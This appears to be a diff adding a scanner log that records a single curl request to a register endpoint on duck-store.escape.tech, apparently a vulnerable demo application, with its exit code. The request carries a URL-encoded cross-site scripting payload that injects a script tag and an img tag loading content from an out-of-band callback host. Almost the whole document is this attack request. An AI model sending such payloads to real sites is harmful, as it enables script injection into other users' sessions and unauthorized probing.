@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null 'https://duck-store.escape.tech/api/v1/auth/register?q=%22%3E%3Cscript+src%3Dhttp%3A%2F%2Foob27623866c293.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in%2Fx.js%3E%3C%2Fscript%3E%3Cimg+src%3Dhttp%3A%2F%2Foob27623866c293.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in%2Fi%3E'
+# exit_code: 0
+# ---
+
